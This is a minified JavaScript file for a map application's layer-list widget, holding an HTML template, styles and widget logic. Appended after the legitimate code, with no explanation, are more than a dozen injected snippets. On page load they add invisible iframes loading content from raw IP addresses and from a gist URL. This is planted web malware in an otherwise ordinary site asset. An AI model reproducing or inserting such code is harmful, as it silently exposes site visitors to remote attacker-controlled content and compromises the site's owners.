"url:widgets/LayerList/Widget.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"layers-section" data-dojo-attach-point\x3d"layersSection"\x3e\r\n    \x3cdiv class\x3d"layer-list-title"\x3e${nls.titleLayers}\x3c/div\x3e\r\n    \x3cdiv class\x3d"layer-list-body" data-dojo-attach-point\x3d"layerListBody"\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e\r\n',"url:widgets/LayerList/css/style.css":'.jimu-widget-layerList{position: relative;}.jimu-widget-layerList .jimu-hr{margin-top: 15px;}.jimu-widget-layerList .layers-section{margin-top: 0px; z-index: 0; position: relative;}.jimu-widget-layerList .layers-section .layers-list{width: 100%;}.jimu-widget-layerList .layers-section .layer-list-title{height: 16px; font-size: 14px; margin-bottom: 14px; font-family: "Avenir Heavy"; margin-left: 8px; margin-right: 8px;}.jimu-widget-layerList .layer-list-body {}.jimu-widget-layerList .layer-list-table{width: 100%; border-spacing: 0px;}.jimu-widget-layerList .layers-list-body{border: 0px solid #999;}.jimu-widget-layerList .jimu-widget-row{}.jimu-widget-layerList .layer-row{height: 40px;}.jimu-widget-layerList .layer-row:hover{background-color: #e3ecf2;}.jimu-widget-layerList .layer-row-mouseover{background-color: #e3ecf2;}.jimu-widget-layerList .jimu-widget-row-selected{background-color: #d9dde0;}.jimu-widget-layerList .jimu-widget-row-active{background-color: #009cff;}.jimu-widget-layerList .jimu-widget-row-selected .col-layer-label{color: #333;}.jimu-widget-layerList .jimu-widget-row-active .col-layer-label{color: #fff;}.jimu-widget-layerList .col{border: 0px solid; border-bottom: 0px solid #ffffff;}.jimu-widget-layerList .col1{}.jimu-widget-layerList .col2{width: auto; word-break: break-word; cursor: pointer;}.jimu-widget-layerList .col3{width: 24px;}.jimu-widget-layerList .begin-blank-div{width: 12px; height: 2px;}.jimu-widget-layerList .col-showLegend{width: 17px; text-align: center;}.jimu-widget-layerList .showLegend-div{width: 13px; height: 13px; cursor: pointer; margin-left: 3px; margin-top: 3px; background-image: url("../images/v_right.png"); background-repeat: no-repeat; background-position: center;}.jimu-rtl .layer-selector .showLegend-div{background-image: url("../images/v_left.png"); margin-left: 0; margin-right: 3px;} .jimu-widget-layerList .showLegend-div.unfold{background-image: url("../images/v.png");}.jimu-widget-layerList .showLegend-div.hidden{background-image: none; cursor: auto;}.jimu-widget-layerList .layers-list-imageShowLegend-down{-moz-transform: scale(1) rotate(270deg) translateX(0px) translateY(0px) skewX(0deg) skewY(0deg); -webkit-transform: scale(1) rotate(270deg) translateX(0px) translateY(0px) skewX(0deg) skewY(0deg); -o-transform: scale(1) rotate(270deg) translateX(0px) translateY(0px) skewX(0deg) skewY(0deg); -ms-transform: scale(1) rotate(270deg) translateX(0px) translateY(0px) skewX(0deg) skewY(0deg); transform: scale(1) rotate(270deg) translateX(0px) translateY(0px) skewX(0deg) skewY(0deg);}.jimu-widget-layerList .layers-list-imageShowLegend-down-div{background-color: #d9dde0;}.jimu-widget-layerList .noLegend-div{width: 33px; text-align: right; display: none;}.jimu-widget-layerList .noLegend-image{display: block; margin: 0 auto;}.jimu-widget-layerList .col-blank{width:17px;}.jimu-widget-layerList .col-select{width: 17px;}.jimu-widget-layerList .col-reserve-blank{width: 25px;}.jimu-widget-layerList .col-content{color: #686868; font-size: 12px;}.jimu-widget-layerList .div-select{position: relative; font-size: 2px;}.jimu-widget-layerList .div-select .checkbox{cursor: auto;}.jimu-widget-layerList .div-content{position: relative; font-size: 12px; border: 0px solid;}.jimu-widget-layerList .div-content.grayed-title{opacity: 0.3;}.jimu-widget-layerList .col-popupMenu{width: 17px; text-align: center;}.jimu-widget-layerList .col-select .jimu-selection-box{margin-top: 5px;}.jimu-widget-layerList .layers-list-body .col-layer-label{color: #686868;}.jimu-widget-layerList .layer-sub-node{display: none; width:100%; border-spacing: 0px;}.jimu-widget-layerList .legend-node-td{}.jimu-widget-layerList .legend-div{overflow: hidden; font-size: 11px;}.jimu-widget-layerList .legend-symbol{}.jimu-widget-layerList .legend-label{margin-top: 17px; color: #686868; font-size: 11px;}.jimu-widget-layerList .esriLegendService {padding-bottom: 0;}.jimu-widget-layerList .esriLegendLayerLabel {padding-top: 0; height: 0; display: none;}.jimu-widget-layerList .esriLegendServiceLabel {display: none;}.jimu-widget-layerList .esriLegendLayer{font-size: 12px;}.jimu-widget-layerList .esriLegendMsg{display: none;}.jimu-widget-layerList .layers-list-popupMenu-div{position: relative; width: 22px; height: 40px; cursor: pointer; border-radius: 2px; float: right; padding-top: 14px; background-image: url("../images/more_normal.svg"); background-repeat: no-repeat; background-position: center 23px;}.jimu-widget-layerList .layers-list-popupMenu-div:hover{background-image: url("../images/more_hover.svg");}.jimu-widget-layerList .layers-list-popupMenu-div .popup-menu-button{background: none;}.jimu-widget-layerList .layers-list-popupMenu-div .popup-menu-button:hover{background: none;}.jimu-widget-layerList .layers-list-popupMenu-div .loading-section {width: 17px; height: 17px; top: 14px; left: 2px; z-index: 1; margin: 0;} .jimu-rtl .jimu-widget-layerList .layers-list-popupMenu-div .loading-section {left: auto; right: 2px;}.jimu-widget-layerList .layers-list-popupMenu-div .popup-menu-loading{width: 17px; height: 17px; margin: -9px 0 0 2px; border-radius: 25px; background-image: url("../images/loading.gif"); background-repeat: no-repeat; background-position: center center; background-size: contain;}.jimu-rtl .jimu-widget-layerList .layers-list-popupMenu-div .popup-menu-loading{}.jimu-widget-layerList .layers-list-popupMenu-div-selected{width: 13px; height: 13px; background-color: #ffffff; border-radius: 2px;}.jimu-widget-layerList .layers-list-popupMenu-image{position: absolute; top: 5px; left: 3px;}.jimu-widget-layerList .popup-menu-transparency-body {position: absolute; background-color: #ffffff; box-shadow: 0px 0px 4px 2px rgba(177, 177, 177, 0.5); outline-width:1px; width: 220px; height:50px; padding-left: 2%; padding-right: 2%; color: #686868; z-index: 2; font-size: 12px; display: none;}.jimu-widget-layerList .popup-menu-transparency-body .transparency-rule{}.jimu-widget-layerList .popup-menu-transparency-body .label {overflow: hidden; margin-top: 2px; margin-bottom: 1px;}.jimu-widget-layerList .jimu-dropmenu .popup-menu-button{width: 22px; height: 22px;}.jimu-widget-layerList .jimu-dropmenu .jimu-icon-btn{width: 22px; height: 22px; min-width: 13px; background-image: url("../images/more_normal.svg"); background-color: rgba(255, 255, 255, 0); border: 0 solid;}.jimu-widget-layerList .layers-list-popupMenu-div:hover .jimu-icon-btn{background-image: url("../images/more_hover.svg"); border: 0 solid; box-shadow: none;}.jimu-widget-layerList .jimu-dropmenu .jimu-icon-btn-selected{background-image: url("../images/more_hover.svg"); border: 0 solid; box-shadow: none;}.jimu-widget-layerList .jimu-dropmenu .drop-menu{min-width: 180px; max-width: 250px; outline-color:#ffffff; outline-style:solid; outline-width:1px; overflow:auto; font-size: 12px; z-index: 2; right: 0px; background-color: #ffffff; box-shadow: 0px 0px 4px 2px rgba(177, 177, 177, 0.5); outline-style: none;}.jimu-widget-layerList .jimu-dropmenu .drop-menu hr{border-bottom: 1px solid #d7dbde !important;}.jimu-widget-layerList .jimu-dropmenu .drop-menu.no-border{outline-style: none; border: none; box-shadow: none;}.jimu-rtl .jimu-widget-layerList .jimu-dropmenu .drop-menu{left: 0px;}.jimu-widget-layerList .jimu-dropmenu .menu-item{position: relative; height: 40px; line-height: 40px; white-space: nowrap; padding: 0px 24px; margin: 0 0; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;}.jimu-widget-layerList .jimu-dropmenu .menu-item:hover{text-decoration: initial; background-color: #f3f3f3;}.jimu-widget-layerList .jimu-dropmenu .menu-item-dissable{opacity: 0.4;}.jimu-widget-layerList .jimu-dropmenu .menu-item-hidden{display: none;}.jimu-widget-layerList .jimu-dropmenu .menu-item a{position: absolute; padding: 0 24px; width: 100%; left: 0;}.jimu-rtl .jimu-widget-layerList .jimu-dropmenu .menu-item a{right: auto; left: 0;}.jimu-widget-layerList .legends-loading-img{width: 45px;}.jimu-widget-layerList .jimu-dropmenu .menu-item .menu-item-description{text-decoration: none; color: inherit; display: block;}.jimu-widget-layerList .layer-list-operations{position: absolute; right: 0; top: 0;}.jimu-rtl .jimu-widget-layerList .layer-list-operations{right: auto; left: 0;}.jimu-widget-layerList .layer-list-operations .setting-image{position: relative; right: 11px; top: -1px;}.jimu-rtl .jimu-widget-layerList .layer-list-operations .setting-image{right: auto; left: 11px;}.jimu-widget-layerList .layer-list-operations .jimu-icon-btn{background-image: url("../images/operation_normal.svg"); background-color: rgba(255, 255, 255, 0);}.jimu-rtl .jimu-widget-layerList .layer-list-operations .jimu-icon-btn{left: auto; right: -8px;}.jimu-widget-layerList .layer-list-operations:hover .jimu-icon-btn{background-image: url("../images/operation_hover.svg"); border: 0 solid; box-shadow: none;}.jimu-widget-layerList .layer-list-operations .drop-menu{min-width:147px !important; top: 21px !important; right: 0 !important; left: auto !important; z-index: 1 !important; background-color: #ffffff; box-shadow: 0px 0px 4px 2px rgba(177, 177, 177, 0.5); outline-style: none !important;}.jimu-rtl .jimu-widget-layerList .layer-list-operations .drop-menu{right: auto !important; left: 0 !important;}.jimu-widget-layerList .layer-list-operations .drop-menu hr{border-bottom: 1px solid #d7dbde !important;}.jimu-widget-layerList .layer-list-operations .drop-menu .menu-item{margin: 0; padding: 0 7px; font-size: 12px; padding: 0 20px;}.jimu-widget-layerList .layer-list-operations .drop-menu .menu-item:hover{text-decoration: initial; background-color: #f3f3f3;}',
"*now":function(t){t(['dojo/i18n!*preload*widgets/LayerList/nls/Widget*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("jimu/BaseWidget dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/html dojo/dom dojo/on dojo/query dijit/registry ./LayerListView ./NlsStrings jimu/LayerInfos/LayerInfos".split(" "),function(t,q,e,g,h,n,l,p,u,r,v,a){return q([t],{baseClass:"jimu-widget-layerList",name:"layerList",_denyLayerInfosReorderResponseOneTime:null,_denyLayerInfosIsVisibleChangedResponseOneTime:null,layerListView:null,operLayerInfos:null,startup:function(){this.inherited(arguments);v.value=this.nls;this._denyLayerInfosIsVisibleChangedResponseOneTime=
this._denyLayerInfosReorderResponseOneTime=!1;if(this.map.itemId)a.getInstance(this.map,this.map.itemInfo).then(e.hitch(this,function(a){this.operLayerInfos=a;this.showLayers();this.bindEvents();n.setSelectable(this.layersSection,!1)}));else{var c=this._obtainMapLayers();a.getInstance(this.map,c).then(e.hitch(this,function(a){this.operLayerInfos=a;this.showLayers();this.bindEvents();n.setSelectable(this.layersSection,!1)}))}},destroy:function(){this._clearLayers();this.inherited(arguments)},_obtainMapLayers:function(){var a=
[],e=[],f={itemData:{baseMap:{baseMapLayers:[]},operationalLayers:[]}};g.forEach(this.map.graphicsLayerIds,function(a){a=this.map.getLayer(a);a.isOperationalLayer&&e.push({layerObject:a,title:a.label||a.title||a.name||a.id||" ",id:a.id||" "})},this);g.forEach(this.map.layerIds,function(b){b=this.map.getLayer(b);b.isOperationalLayer?e.push({layerObject:b,title:b.label||b.title||b.name||b.id||" ",id:b.id||" "}):a.push({layerObject:b,id:b.id||" "})},this);f.itemData.baseMap.baseMapLayers=a;f.itemData.operationalLayers=
e;return f},showLayers:function(){this.layerListView=(new r({operLayerInfos:this.operLayerInfos,layerListWidget:this,config:this.config})).placeAt(this.layerListBody)},_clearLayers:function(){this.layerListView&&this.layerListView.destroyRecursive&&this.layerListView.destroyRecursive()},_refresh:function(){this._clearLayers();this.showLayers()},bindEvents:function(){this.own(l(this.operLayerInfos,"layerInfosChanged",e.hitch(this,this._onLayerInfosChanged)));this.own(l(this.operLayerInfos,"tableInfosChanged",
e.hitch(this,this._onTableInfosChanged)));this.own(this.operLayerInfos.on("layerInfosIsVisibleChanged",e.hitch(this,this._onLayerInfosIsVisibleChanged)));this.own(l(this.operLayerInfos,"layerInfosReorder",e.hitch(this,this._onLayerInfosReorder)));this.own(l(this.map,"zoom-end",e.hitch(this,this._onZoomEnd)));this.own(l(this.operLayerInfos,"layerInfosRendererChanged",e.hitch(this,this._onLayerInfosRendererChanged)));this.own(l(this.operLayerInfos,"layerInfosOpacityChanged",e.hitch(this,this._onLayerInfosOpacityChanged)))},
_onLayerInfosChanged:function(){this.layerListView.refresh()},_onTableInfosChanged:function(){this.layerListView.refresh()},_onLayerInfosIsVisibleChanged:function(a){this._denyLayerInfosIsVisibleChangedResponseOneTime?this._denyLayerInfosIsVisibleChangedResponseOneTime=!1:g.forEach(a,function(a){p("[class~\x3d'visible-checkbox-"+a.id+"']",this.domNode).forEach(function(c){c=u.byNode(c);a.isVisible()?c.check():c.uncheck()},this)},this)},_onZoomEnd:function(){this.operLayerInfos.traversal(e.hitch(this,
function(a){p("[class~\x3d'layer-title-div-"+a.id+"']",this.domNode).forEach(function(c){try{a.isInScale()?h.removeClass(c,"grayed-title"):h.addClass(c,"grayed-title")}catch(f){console.warn(f.message)}},this)}))},_onLayerInfosReorder:function(){this._denyLayerInfosReorderResponseOneTime?this._denyLayerInfosReorderResponseOneTime=!1:this._refresh()},_onLayerInfosRendererChanged:function(a){try{g.forEach(a,function(a){this.layerListView.redrawLegends(a)},this)}catch(m){this._refresh()}},_onLayerInfosOpacityChanged:function(a){g.forEach(a,
function(a){var c=void 0===a.layerObject.opacity?1:a.layerObject.opacity;a=p("[layercontenttrnodeid\x3d'"+a.id+"']",this.domNode)[0];p(".legends-div.jimu-legends-div-flag img",a).style("opacity",c)},this)},onAppConfigChanged:function(a,e,f){this.appConfig=a}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});